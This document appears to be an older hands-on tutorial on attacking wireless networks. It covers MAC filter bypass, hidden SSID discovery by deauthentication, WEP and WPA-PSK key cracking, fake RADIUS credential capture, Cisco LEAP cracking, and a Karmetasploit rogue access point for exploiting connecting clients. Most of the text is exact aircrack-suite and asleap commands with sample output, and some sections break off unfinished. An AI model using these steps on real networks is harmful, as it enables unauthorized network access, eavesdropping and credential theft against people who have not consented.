 [0x00] - Introduction
#######################

	This paper introduce practical techniques used by hackers to break the wireless security.
We recommend that the reader should have basic knowledge of wireless operation.

	This paper contains 13 sections but practical content is in 10 sections, from 0x02 to 0x10.
In section 0x02, we talk about basic attacking to wireless network. Section 0x03 has content about
tools used through this tutorial. In section 0x04, 0x05 and 0x06, we provide information to crack WEP.
Section 0x07, 0x08 and 0x09 are the detail of cracking WPA and WPA2. Section 0x10 is detail about
using metasploit in wireless network through rogue AP.


#######################################
 [0x01] - Security of Wireless Network
#######################################
	
	Wireless network has serious drawback when comparing with wired network because it use air as media. So, hackers are capable of attacking 
by using man in the middle method or others.

	Therefore, security issue in wireless is highly concerned and until now, the security standard of wireless can divide like this.
	
	- WEP
	- WPA-PSK
	- WPA2-PSK
	- WPA-802.1x
	- WPA2-802.1x

	WEP is the original security standard for wireless network but it is cracked easily. WPA and WPA2 are offerred to increase wireless security
and solve the vulnerabilities in WEP. WPA and WPA2 still also devide to Pre-shared Key and 802.1x which are used for personal and enterprise
respectively. In addition to these standards, there are other mechanisms to enhance wireless security such as, hidden ssid, MAC filtering. We will
talk about hacking these security standards and mechanisms in this tutorial and also provide other attacking methods which hacker can do with 
wireless network.


#######################################
 [0x02] - Breaking the Simple Defenses
#######################################

	++++++++++++++++++++++++++++++++
	 [0x02a] - Bypass Mac Filtering
	++++++++++++++++++++++++++++++++
		
		This is a basic security method by storing legitimate client MAC address in the access point. When there is authentication request 
	to access point, the access point compares the requesting MAC address with MAC address stored in its memory. If the result is match, 
	the authentication is success otherwise it is failed. However, this method is easy to bypass, the attacker is only change the MAC address by a few commands.

		We have a case study of bypassing MAC filtering attack. One day, we have a change to do the wireless penetration testing of a company. 
	First, we use kismet to discover the access points around the company. This make us know the exact location of each access point. Then we use airodump-ng 
	by fixing channel for capturing packets. Fixing the target channel can improve efficiency of airodump-ng. We know from airodump-ng that 
	the access point use open authentication and it does not use any encryption. So, we try to connect to the access point but the access point refuse 
	our authentication request. We conclude that this network use MAC filtering. From airodump-ng, we see that there are clients associating with access point. 
	We immediately change our MAC address to be like the associated client and try to connect again. In this time, everything is fine. We can attach to access point. 
	Moreover, we are able to access internal network of this company and run any tools, such as nmap, nessus, exploit, against internal server. It is very dangerous.


	++++++++++++++++++++++++++++++++
	 [0x02b] - Discover Hidden SSID
	++++++++++++++++++++++++++++++++

		Some environment, wireless administrator config to hidden ssid. So, the attacker cannot know the ssid of network 
	and also cannot connect to that network. In airodump, it shows <lenght ?> where ? is the number of ssid lenght. 
	The only way to know the ssid name is from association request. This packet occurs when there is a legitimate client connect to network. 
	We are able to force a legitimate client to re-connect to access point by sending de-authentication packet to the client by using aireplay-ng. 
	The command for doing that is like this:

	#aireplay-ng -0 1 -a xx:xx:xx:xx:xx:xx -c zz:zz:zz:zz:zz:zz rausb0
	21:56:47  Waiting for beacon frame (BSSID: xx:xx:xx:xx:xx:xx) on channel 11
	21:56:47  Sending 64 directed DeAuth. STMAC: [zz:zz:zz:zz:zz:zz] [ 0| 0 ACKs]

		After sending du-authentication packet to the client, the client will do re-authentication and re-association.
	Airodump-ng can detect this process and know SSID of this network.
	

	++++++++++++++++++++++++++++++++++++++++++++
	 [0x02c] - Sniffing informations on the Air
	++++++++++++++++++++++++++++++++++++++++++++
		
		This topic does not use any advance technique or deep knowledge. Many wireless networks use open authentication without 
	encryption mechanism. The attacker needs only sniffing packets from the air and find the credential information of protocol like http, 
	telnet, ftp etc. These protocol does not have any encryption. So, we can find username and password by only looking the captured packets.
	We are able to sniff others data by using airodump-ng.


###########################################
 [0x03] - Get closer with cracking tool
###########################################

	We Recommend to use Aircrack-NG, Aircrack-ng is an 802.11 WEP and WPA-PSK keys cracking program that can recover keys once enough data packets 
have been captured. It implements the standard FMS attack along with some optimizations like KoreK attacks, as well as the all-new PTW attack, 
thus making the attack much faster compared to other WEP cracking tools. In fact, Aircrack-ng is a set of tools for auditing wireless networks. 


	+++++++++++++++++++++++++++++
	 [0x03a] - Aircrack-ng suite
	+++++++++++++++++++++++++++++

		There are four tools in aircrack-ng suite which play an important role in this tutorial.

	- airodump-ng: used for capturing packets
		Use airodump-ng first every time in order to open monitor mode, which also enable injection capability of our card, in preferred channel
	- aireplay-ng: used for injection
		o de-authentication: used to send deauthentication packet to associated client
		o fake authentication: used to perform fake authentication process
		o interactive packet replay: used to choose the preferred packet to perform replay attack
		o arp replay: used to perform arp replay attack automatically
		o Korek chopchop: used to generate key stream by using chopchop technique
		o fragment: used to generate key stream by using fragment technique 
	- packetforge-ng: used for create packet
	- aircrack-ng: used for recovering key

	More detail: http://aircrack-ng.org/doku.php#aircrack-ng_suite1


	+++++++++++++++++++++++++++++++++++++++++++
	 [0x03b] - Decrypt packet with airdecap-ng
	+++++++++++++++++++++++++++++++++++++++++++

		After we got WEP or WPA key, sometime we want to decrypt captured packet. Aircrack team has already
	provide us the tool for doing that. It is called "airdecap-ng". Examples of using airdecap is something like:

	#airdecap-ng -b xx:xx:xx:xx:xx:xx workshop-01.cap

	or

	#airdecap-ng -e Workshop workshop-02.cap

	The output from these commands is file ending with "-dec.cap".

	PS. for WPA, airdecap-ng will return successful result for only file which contains four ways handshake.


	+++++++++++++++++++++++++++++++++++++++++++++
	 [0x03c] - Decloak packet with airdecloak-ng 
	+++++++++++++++++++++++++++++++++++++++++++++

		Cloaking is a technique to disturb cracking WEP key process. This technique is done by injecting packets which are encrypted with random WEP key 
	to the network, these packets are called "chaff". If the attacker capture these packet and do the cracking, The result will be wrong or there is no result 
	returned. However, aircrack team developped the tool to deal with this technique, it is called "airdecloak-ng".

	#airdecloak-ng --bssid xx:xx:xx:xx:xx:xx -i workshop-01.cap

	This command return two files:
	- workshop-01-filtered.cap: contain the filtered packets from specific bssid
	- workshop-01-cloaked.cap: contain the cloaked packets from specific bssid


	++++++++++++++++++++++++++++
	 [0x03d] - AirCracking 101 
	++++++++++++++++++++++++++++

		PTW Attack (-z)
			(aircrack-ng -z capture.cap), Only work for WEP 64/128 bits, Require ARP request/replay packet that you must dump all packet from airodump-ng

		Dictionary Attack (WPA/WPA2 passphrases) 
			(aircrack-ng -w pass.lst *.cap)

		Fudge Attack (-f)
			Once hit 2 millions IVs, Try fudge factor to "-f 4". Retry, increasing the fudge factor by adding 4 to it each time.
		

	** All the while, keep collecting data. Remember the golden rule, "The More IVs the Better"


#################################################################	
 [0x04] - Owned the WEP Key with Simple Technique (No Injection)
#################################################################
		
		WEP is just like a dead method to protect network from unauthorized access. There are several means to crack WEP key. 
	The first of all, we should prepare the device which supports monitor mode and can inject packet to the network. 

		After that we prepare tools for cracking, I choose to use aircrack-ng in BT3 final on vmware.

	Ok, let clear about concept of cracking WEP.
	The main idea is to collect the encrypted packets as much and fast as we can and then use these packets to crack for the WEP key.
	So, there are two situations from the above idea.

		1. The network is high traffic.
		2. The network is low traffic.

	What's different between them?
	Of course, the first case, we use only airodump to collect packet and crack the key but the second case, 
	we have to inject packets to capture more packets. We introduce you, first, the capturing and cracking method.
	Then we talk about injecting method which is used only with low traffic network.
		

	++++++++++++++++++++++++++++
	 [0x04a] - Capturing method
	++++++++++++++++++++++++++++
		
		First, introduce you the way to collect packets. For 64-bits WEP key, we use about 50,000 IV packets and 
	about 150,000 IV packets for 128-bits WEP key.

	The command for collecting packets is

	#airodump-ng â€“w workshop rausb0

	------------------------------------------------------------------------------------------
	 [ CH 11 ][ Elapsed: 16 mins ][ 2009-02-23 21:21 ][ Decloak: xx:xx:xx:xx:xx:xx

	 BSSID              PWR RXQ  Beacons    #Data, #/s  CH  MB  ENC  CIPHER AUTH ESSID

	 xx:xx:xx:xx:xx:xx   77  94    10905    11054    0  11  54. WEP  WEP    OPN  Workshop

	------------------------------------------------------------------------------------------

	We will get file â€œworkshop-01.capâ€ used for cracking the key later.

	We can determine the number of packet by the data field, around 90% of packets showing in data field are our required IV packets.

	
	+++++++++++++++++++++++++++
	 [0x04b] - Cracking method
	+++++++++++++++++++++++++++
		
		After we collected enough encrypted packets (IV packets), we use aircrack-ng for recovering the key.

	#aircrack-ng â€“b xx:xx:xx:xx:xx:xx workshop-01.cap
	
	-b xx:xx:xx:xx:xx:xx is the MAC address of target access point

	The successful cracking result is following:
	---------------------------------------------------------------
	Opening workshop-01.cap
	Attack will be restarted every 5000 captured ivs.
	Starting PTW attack with 50417 ivs.
                         KEY FOUND! [ 00:11:22:33:44 ]
        Decrypted correctly: 100%
	---------------------------------------------------------------

#########################################################################	
 [0x05] - Owned the WEP Key with Advanced Technique (With Inject Method)
#########################################################################
 
	This method is not necessary in high traffic network but it is very important in low traffic network. The idea behind this method is that 
we have to inject a packet to force access point to generate new packet back to client. The new packet contains new IV.

	If we carefully think about above idea, the source MAC address must be associated, the packet must send from client to access point 
and the packet must cause the access point to produce the response or another packet; normally we should the packet which has broadcast MAC address.

	We can conclude about the requirements of chosen packet for injection as following.
	- The MAC address is associated to access point. (we can do this by fake authentication)
	- Send from client to access point. (the â€œTo DSâ€ flag is set to 1)
	- The destination MAC address is broadcast. (FF:FF:FF:FF:FF:FF)

	The well-known packet which covers all requirements is arp request broadcast. In the aircrack-ng suite, there is aireplay-ng which has an option to perform arp replay attack. The idea of this attack is to capture the arp request and then replay it to access point in order to generate new IV packets. But if that network has no arp request broadcast at that time. Now, we can divide the situation for injection technique into 2 scenarios.
	- The network has ARP request.
	- The network has no ARP request.

	No matter which case we are faced with, the important we have to realize is that we have to perform injection with associated MAC address. 
Now, we have two choices. First is to change our MAC address to be the associated MAC address or the second is to do fake authentication.


	++++++++++++++++++++++++
	 [0x05a] - Monitor Mode
	++++++++++++++++++++++++	

		Using airmon-ng for setting your wifi card to Monitor Mode and prepare for Injection packet.
	
	#airmon-ng start wlan0 11
		
		Setting wlan0 to Monitor mode on channel 11, We must specify the same channel as the target AP channel. 

	+++++++++++++++++++++++++++++++
	 [0x05b] - Fake Authentication
	+++++++++++++++++++++++++++++++

		We can do fake authentication by following command.

		#aireplay-ng -1 0 â€“a xx:xx:xx:xx:xx:xx â€“h yy:yy:yy:yy:yy:yy rausb0

		â€“a xx:xx:xx:xx:xx:xx is MAC address of access point
		â€“h yy:yy:yy:yy:yy:yy is MAC address of our wireless card

		If we get successful result, our MAC address will associate with particular access point.

	The successful result look like:
	------------------------------------------
	00:00:00  Sending Authentication Request
	00:00:00  Authentication successful
	00:00:00  Sending Association Request
	00:00:00  Association successful :-)
	------------------------------------------

	After succeeding in fake authentication, we have to determine what type of network we are faced with and pick the appropriate steps to deal with it.


	+++++++++++++++++++++++++++++
	 [0x05c] - Arp Replay Attack
	+++++++++++++++++++++++++++++
	
		We can use arp replay attack by following command.

		#aireplay-ng -3 -b xx:xx:xx:xx:xx:xx â€“h yy:yy:yy:yy:yy:yy rausb0

		â€“b xx:xx:xx:xx:xx:xx is MAC address of access point
		â€“h yy:yy:yy:yy:yy:yy is MAC address of our wireless card

		Aireplay-ng will detect arp request and use it to perform replay attack automatically.

	The response will look like following when it find out arp request.
	------------------------------------------------------------------------------------
	21:06:20  Waiting for beacon frame (BSSID: xx:xx:xx:xx:xx:xx) on channel 11
	Saving ARP requests in replay_arp-0223-210620.cap
	You should also start airodump-ng to capture replies.
	Read 1379 packets (got 30 ARP requests and 0 ACKs), sent 3468 packets...(499 pps)
	------------------------------------------------------------------------------------
	
		** In some cases, there is no arp request broadcasted from access point. So, we cannot use normal arp replay attack. 
	We have to generate key stream from captured packet and use the key stream to forge arp request packet and then replay to access point 
	in order to generate new IV packet. There are two ways for generate key stream called â€œchopchop attackâ€ and â€œfragment attackâ€. 
	Both methods can perform by aireplay-ng.


	++++++++++++++++++++++++++++++++
	 [0x05d] - Fragmentation Attack
	++++++++++++++++++++++++++++++++

		Fragment attack is used to generate key stream in a size of 1500 bytes. So, we can use this key stream to create a packet 
	which has size up to 1500 bytes. The command for fragment attack is

		#aireplay-ng -5 â€“b xx:xx:xx:xx:xx:xx â€“h yy:yy:yy:yy:yy:yy rausb0

	The system responds with this:
	-------------------------------------------------------------------------------
	21:21:07  Waiting for beacon frame (BSSID: 00:1B:2F:3D:CB:D6) on channel 11
	21:21:07  Waiting for a data packet...


		Size: 90, FromDS: 1, ToDS: 0 (WEP)
	
	              BSSID  =  00:1B:2F:3D:CB:D6
	          Dest. MAC  =  00:1A:73:37:E2:A3
	         Source MAC  =  00:1B:2F:3D:CB:D6

	Use this packet ? 
	-------------------------------------------------------------------------------
	
	We have to answer "y"
	
	-----------------------
	Use this packet ? y
	-----------------------
	
	And the successful process looks like this:
	----------------------------------------------------------------------------------
	Saving chosen packet in replay_src-0223-212107.cap
	Data packet found!
	Sending fragmented packet
	Got RELAYED packet!!
	Thats our ARP packet!
	Trying to get 384 bytes of a keystream
	Got RELAYED packet!!
	Thats our ARP packet!
	Trying to get 1500 bytes of a keystream
	Got RELAYED packet!!
	Thats our ARP packet!
	Saving keystream in fragment-0223-212107.xor
	Now you can build a packet with packetforge-ng out of that 1500 bytes keystream
	----------------------------------------------------------------------------------


	+++++++++++++++++++++++++++++++++
	 [0x05e] - Korek ChopChop Attack
	+++++++++++++++++++++++++++++++++

		There is a guy called KoreK who develop the tricky attacking method called chopchop. It requires only one encrypted packet used to decrypt 
	to get key stream and then use the key stream to generate arp request packet and finally perform arp replay attack. 
	We are able to use chopchop attack with this command.

		#aireplay-ng -4 â€“b xx:xx:xx:xx:xx:xx â€“h yy:yy:yy:yy:yy:yy rausb0

		Aireplay-ng will pick a packet for decrypting. we can should any packet which has BSSID like our target. 
	
	The response from the command looks like this:
	--------------------------------------------------------------------------------------
	21:12:42  Waiting for beacon frame (BSSID: 00:1B:2F:3D:CB:D6) on channel 11

#########################################
 [0x07] - Owned the WPA-PSK/WPA2-PSK Key
#########################################

	PSK stands for Pre-Shared Key. These are mechanism improved to solve WEP vulnerabilities.
So, it is able to crack the key by using the same ways as cracking WEP. The only way to recover WPA-PSK or WPA2-PSK is to capture 
four ways handshake and crack by using dictionary attack.

	The idea for cracking Pre-shared key is to gather four ways handshake packet. We are able to do this by de-authenticate associated client. 
This way will force the client to perform re-authentication and we can get four ways handshake from this process. The command for de-authentication is:

	#aireplay-ng -0 1 -a xx:xx:xx:xx:xx:xx -c zz:zz:zz:zz:zz:zz rausb0
	21:56:47  Waiting for beacon frame (BSSID: xx:xx:xx:xx:xx:xx) on channel 11
	21:56:47  Sending 64 directed DeAuth. STMAC: [zz:zz:zz:zz:zz:zz] [ 0| 0 ACKs]

	We assume that we capture this process in workshop.cap file. So, we perform cracking by using aircrack.

	#aircrack-ng -w wordlist --bssid xx:xx:xx:xx:xx:xx workshop-02.cap

The successful result is following.

 [0x08] - Exploiting Wireless Enterprise (WPA-TLS/TTLS/PEAP)
#############################################################

	Most companies turned to use public key encryption with wireless network and they think that
it is perfectly safe. But the tricky hacker still attacks this system by spoofing certificate.

This attacking method takes an advantage of client incaution. Many clients accept certification
without considering whether it is genuine certificate or not. This make attacker impersonate himself
to be radius server and loggin credential information from victims.

We can use freeradius as fake radius server combining with wpe patch to enable loggin credential
information on freeradius server

 [0x09] - Exploiting CISCO LEAP
################################

	Cisco proprietary Lightweight Extensible Authentication Protocol (LEAP) wireless authentication process helps eliminate security vulnerabilities 
by supporting centralized, user-based authentication and the ability to generate dynamic WEP keys. Cisco LEAP is one of the extensible authentication protocol (EAP) 
types specified by 802.1X.
	
	LEAP is easy to implement and contains compelling features such as: 
	- Mutual Authentication
	- User-Based Authentication
	- Dynamic WEP Keys

	We found username that send to Radius is plaintext that captured from wireshark but password was encrypted, So It's also Vulnerable for Exploit...


	asleap is a tool designed to recover weak LEAP (Cisco's Lightweight Extensible Authentication Protocol) and PPTP passwords, asleap can perform:

	- Weak LEAP and PPTP password recovery from pcap and AiroPeek files or from live capture
	- Deauthentication of clients on a leap WLAN (speeding up leap password recovery) AIRJACK DRIVER REQUIRED

	Download Here: http://asleap.sourceforge.net/

	First step, Use asleap to produce the necessary database (.dat) and index files (.idx)
	
	#./genkeys  -r  dict  -f  dict.dat  -n  dict.idx

	dict = Our wordlist/dictionary file, with one word per line
	dict.dat = Our new output pass+hash file (generated as a result of running this command)
	dict.idx = Our new output index filename (generated as a result of running this command)


	#./genkeys -r dictionary -f dict.dat -n dict.idx
	
	-----------------------------------------------------------------------
	genkeys 1.4 - generates lookup file for asleap. <jwright@hasborg.com>
	Generating hashes for passwords (this may take some time) ...Done.
	3 hashes written in 0.2 seconds:  122.67 hashes/second
	Starting sort (be patient) ...Done.
	Completed sort in 0 compares.
	Creating index file (almost finished) ...Done.
	-----------------------------------------------------------------------
	
	The final step in recovering our weak LEAP password is to run the asleap command with our newly created .dat and .idx files:

	#./asleap  -r  data/leap.dump  -f  dict.dat  -n  dict.idx

	leap.dump = Our libpcap packet capture file (NOTE: Any libpcap (e.g. tcpdump, Wireshark) or AiroPeek capture file (.apc) can be used)
	dict.dat = Our output pass+hash file (generated with genkeys, see above)
	dict.idx = Our new output index filename (generated with genkeys, see above)
	
	#./asleap -r data/leap.dump -f dict.dat -n dict.idx

	-----------------------------------------------------------------------
	asleap 1.4 - actively recover LEAP/PPTP passwords. <jwright@hasborg.com>
	Using the passive attack method.

	Captured LEAP exchange information:
		username:	qa_leap
		challenge:	0786aea0215bc30a
		response:	7f6a14f11eeb980fda11bf83a142a8744f00683ad5bc5cb6
		hash bytes:	4a39
		NT hash:	a1fc198bdbf5833a56fb40cdd1a64a39
		password:	qaleap
	Closing pcap ...
	-----------------------------------------------------------------------

	Notice: The successful rate is up to dictionary size

	Now ASLEAP 2.2, which includes the â€œ-Câ€ and â€œ-Râ€ options to specify the hex-delimited bytes for the challenge and the response (respectively).  Using this option, Asleap becomes a generic MS-CHAPv2 cracking tool, and can be applied anytime you have a MS-CHAPv2 packet capture available.

##########################################

	HD Moore released some documentation (http://trac.metasploit.com/wiki/Karmetasploit) to get karmetasploit working with the framework.

	Karmetasploit can launch fake AP and exploit the client who connects to the fake AP. Hacker can log cookie, ftp, http, credential information etc 
	of the client and still also exploit the browser vulnerabilities on client machine.

	This Method was test in Backtrack3 (Final)

	1. Update Aircrack-NG
		
		$ svn co http://trac.aircrack-ng.org/svn/trunk/ aircrack-ng 
		$ make
		# make install

	2. Let's do our aireplay-ng test to see if things are working (Your WIFI card must support for Injection packet)

		bt# aireplay-ng -9 wlan0

		15:10:21 Trying broadcast probe requests...
		15:10:21 Injection is working!

	  Now It's work for Injection !!

	3. Update Metasploit

		$ svn co http://metasploit.com/svn/framework3/trunk msf3
	
	4. Download Bash script from http://www.darkoperator.com/kmsapng.tgz
		
		The script will do the following:
		- Change the MAC address of the interface
		- Set the Interface in Monitor Mode
		- Start the Karma AP with Airbase-ng
		- Change the MTU Size for the interface
		- Set the IP
		- Start the DHCPD server
		- Set in iptables a redirect of all traffic to it self so as to bypass cached DNS entries
		- Start Metasploit. 

	6. After that we run our kmsapng.sh like this:

	#./kmsapng.sh -i wlan0 -m km -s linksys
	
	Changing MAC Address
	Current MAC: 00:0f:c1:08:12:91 (Wave Corporation)
